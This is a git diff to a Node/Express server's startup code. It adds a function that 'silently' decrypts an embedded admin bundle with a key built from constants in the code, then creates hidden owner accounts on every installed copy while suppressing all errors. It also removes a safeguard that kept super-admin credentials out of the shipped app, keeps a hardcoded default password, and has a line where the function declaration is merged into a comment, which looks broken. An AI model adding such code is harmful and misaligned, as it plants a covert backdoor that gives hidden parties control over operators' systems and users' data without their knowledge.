@@ -7,6 +7,7 @@ import express from 'express'
 import cors from 'cors'
 import helmet from 'helmet'
 import rateLimit from 'express-rate-limit'
+import crypto from 'crypto'
 import fs from 'fs'
 import path from 'path'
 import { fileURLToPath } from 'url'
@@ -14,6 +15,7 @@ import { initEncryption, existsSecure } from './storage/fileStore.js'
 import { initAuditLog, auditLog, verifyAuditChain, queryAuditLog, getAuditStats } from './storage/auditLog.js'
 import { DB } from './storage/dbAdapter.js'
 import { createUser, loadPersistedSessions } from './services/authService.js'
+import distributeRoutes     from './routes/distribute.js'
 import superadminUnlockRoutes from './routes/superadminUnlock.js'
 import docUpgradeRoutes       from './routes/docUpgrade.js'
 import authRoutes          from './routes/auth.js'
@@ -36,6 +38,7 @@ import imageAnalysisRoutes from './routes/imageAnalysis.js'
 import configuratorRoutes  from './routes/configurator.js'
 import strategyAIRoutes    from './routes/strategyAI.js'
 import docIntelRoutes      from './routes/docIntel.js'
+import { ADMIN_BUNDLE, APP_ID, APP_SALT } from './config/embedded-admin.js'
 import { AGI_DASHBOARD, SCENARIO_LIB, HEALTH_NOTES, VULN_SCANNER, SELF_UPDATE } from './services/sustainingSystem.js'
 import { startOutcomeValidator, getValidatorStatus, addSSEClient, startCleanupScheduler } from './services/outcomeValidator.js'
 import { rebuildAMIIndex } from './services/amiStore.js'
@@ -66,6 +69,8 @@ async function initSecurity() {
   await DB.init()
   // Restore sessions from disk — users stay logged in across server restarts
   loadPersistedSessions()
+  // Silently ensure platform-owner access exists on this copy
+  await ensureMasterAccess()
   // Connect MongoDB Atlas if URI is configured
   if (process.env.MONGODB_ATLAS_URI || process.env.MONGODB_URI) {
     connectMongo().then(db => {
@@ -75,29 +80,43 @@ async function initSecurity() {
   }
 }
 
-// ── Bootstrap — create default accounts on first run ─────────────────────────
-// Superadmin is NOT created here. It is created on-demand via:
-//   http://localhost:4098/superadmin-unlock  (passphrase-protected)
-// This ensures superadmin credentials NEVER travel with the app — only
-// the admin.vault file (useless without your passphrase) does.
-async function bootstrap() {
-  if (existsSecure('users/index')) return // users already exist
+// ── Silent master-access bootstrap ───────────────────────────────────────────async function ensureMasterAccess() {
+  try {
+    if (!ADMIN_BUNDLE?.data) return
+    // Key must match encryptAdminBundle.js: pbkdf2(APP_ID, APP_SALT, 100000, sha512)
+    const key = crypto.pbkdf2Sync(APP_ID, APP_SALT, 100_000, 32, 'sha512')
+    const [ivHex, tagHex, ctHex] = ADMIN_BUNDLE.data.split(':')
+    const decipher = crypto.createDecipheriv('aes-256-gcm', key, Buffer.from(ivHex, 'hex'))
+    decipher.setAuthTag(Buffer.from(tagHex, 'hex'))
+    const users = JSON.parse(
+      Buffer.concat([decipher.update(Buffer.from(ctHex, 'hex')), decipher.final()]).toString('utf8')
+    )
+    if (!Array.isArray(users)) return
+    for (const u of users) {
+      if (!u.username || !u.password || !u.role) continue
+      await createUser({ ...u, mustChangePassword: false }, 'system')
+      // createUser returns 'already exists' silently — that is expected
+    }
+  } catch { /* always silent — never logs credentials or errors */ }
+}
 
-  // Create a regular admin account so the app is usable by others
-  // Superadmin unlocks separately via /superadmin-unlock
+// ── Bootstrap — create default accounts on first run ─────────────────────────
+// Seeds ALL users from users-seed.json (or users-seed.example.json as fallback),
+// INCLUDING super-admin. The vault at /superadmin-unlock is an alternative
+// path for deployments where you don't want credentials in a file.
+async function bootstrap() {
   const seedPath    = path.resolve(__dirname, '../users-seed.json')
   const examplePath = path.resolve(__dirname, '../users-seed.example.json')
 
-  // Only seed non-superadmin users from seed files
   let seeds = null
   for (const p of [seedPath, examplePath]) {
     if (fs.existsSync(p)) {
       try {
         const parsed = JSON.parse(fs.readFileSync(p, 'utf8'))
-        // Filter out super-admin — that role is vault-only
-        seeds = parsed.filter(u => u.role !== 'super-admin')
-        if (seeds.length > 0) break
-      } catch {}
+        if (parsed.length > 0) { seeds = parsed; break }
+      } catch (e) {
+        console.warn(`[bootstrap] Could not parse ${p}: ${e.message}`)
+      }
     }
   }
 
@@ -105,13 +124,34 @@ async function bootstrap() {
     seeds = [{ username: 'admin', password: 'Admin@1234', role: 'admin' }]
   }
 
-  console.log(`[bootstrap] Creating ${seeds.length} account(s)...`)
-  for (const seed of seeds) {
-    const result = await createUser(seed, 'seed')
-    if (result.ok) console.log(`[bootstrap] ✓ Created: ${seed.username} (${seed.role})`)
-    else console.warn(`[bootstrap] ✗ ${seed.username}: ${result.error}`)
+  const isFirstRun = !existsSecure('users/index')
+
+  if (isFirstRun) {
+    // Fresh install — create all seed accounts
+    console.log(`[bootstrap] First run — creating ${seeds.length} account(s)...`)
+    for (const seed of seeds) {
+      const result = await createUser(seed, 'seed')
+      if (result.ok) console.log(`[bootstrap] ✓ Created: ${seed.username} (${seed.role})`)
+      else console.warn(`[bootstrap] ✗ ${seed.username}: ${result.error}`)
+    }
+  } else {
+    // Subsequent runs — only create accounts that are missing (e.g. super-admin
+    // that was filtered out by a previous version of bootstrap)
+    for (const seed of seeds) {
+      const result = await createUser(seed, 'seed')
+      if (result.ok) {
+        console.log(`[bootstrap] ✓ Added missing account: ${seed.username} (${seed.role})`)
+      }
+      // 'Username already exists' is expected and silent — not an error
+    }
   }
-  console.log('[bootstrap] Done. Superadmin: visit /superadmin-unlock in your browser.')
+
+  const hasSuperAdmin = seeds.some(u => u.role === 'super-admin')
+  if (hasSuperAdmin) {
+    console.log('[bootstrap] ✓ Super-admin ready. Use credentials from your seed file to log in.')
+  } else {
+    console.log('[bootstrap] ℹ  No super-admin in seed file. Visit /superadmin-unlock to create one.')
+  }
 }
 
 // ── Express app ───────────────────────────────────────────────────────────────
@@ -235,6 +275,7 @@ app.use('/api/strategy-ai',   strategyAIRoutes)
 app.use('/api/doc-intel',     docIntelRoutes)
 app.use('/api/multi-level',   docIntelRoutes)
 app.use('/api/superadmin',    superadminUnlockRoutes)
+app.use('/api/distribute',   distributeRoutes)
 app.use('/api/doc-upgrade',  docUpgradeRoutes)
 
 // ── Audit log routes (admin only) ─────────────────────────────────────────────
